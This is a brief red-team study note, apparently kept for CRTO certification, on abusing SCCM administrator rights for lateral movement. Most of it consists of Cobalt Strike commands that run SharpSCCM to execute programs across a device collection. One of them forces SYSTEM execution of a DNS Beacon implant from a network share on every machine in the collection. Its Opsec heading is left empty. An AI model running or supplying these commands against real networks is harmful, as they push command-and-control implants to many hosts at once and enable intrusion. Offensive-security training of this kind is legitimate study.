
With Full or Application Administrator privileges over a device or a collection ([[Network Account Credentials]]), we can deploy scripts or applications to aid in lateral movement.

#### 🖊️ via Cobalt Strike

1) Test command execution with `exec -n DEV -p <path>` , in this example we execute one command across the entire collection (named DEV):

`beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner`

⚠ If a user is not logged in, then the command won't execute.

2) We can force it to execute as SYSTEM using the `-s` parameter, and this will execute on every machine regardless of whether a user is currently logged in or not.
In this example, we try to upload and execute a DNS Beacon payload.

`beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner`




#### ⚠ Opsec




### Properties
---
📆 created   {{25-02-2024}} 12:10
🏷️ tags: #redteam #crto 

---

